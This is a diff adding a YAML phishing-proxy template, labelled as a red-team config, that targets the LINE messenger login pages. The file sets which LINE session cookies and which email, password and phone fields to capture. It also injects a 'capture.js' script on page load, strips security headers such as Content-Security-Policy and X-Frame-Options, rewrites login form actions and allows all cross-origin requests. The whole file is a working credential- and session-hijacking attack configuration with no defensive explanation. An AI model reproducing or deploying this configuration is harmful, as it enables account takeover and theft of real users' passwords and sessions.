@@ -1,0 +1,39 @@
+name: "LINE"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "account"
+    target: "account.line.me"
+  - subdomain: "access"
+    target: "access.line.me"
+auth_urls: 
+  - "/login"
+  - "/v2"
+landing_path: ["/v2/login"]
+auth_tokens:
+  - {type: "cookie", name: "line_session"}
+  - {type: "cookie", name: "line_login"}
+  - {type: "cookie", name: "csrf"}
+credentials:
+  - {type: "post_param", name: "email", regex: "^[^@]+@[^@]+\\.[^@]+$"}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "phone", regex: "^\\+[0-9]{1,15}$"}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "X-XSS-Protection"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/v2/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "line-analytics|/track/|/sdk/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*='auth']", action_to: "/v2/auth"}
+bridges:
+  - {prefix: "/v2/", target_host: "access.line.me", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS"]
+  headers: ["*"]
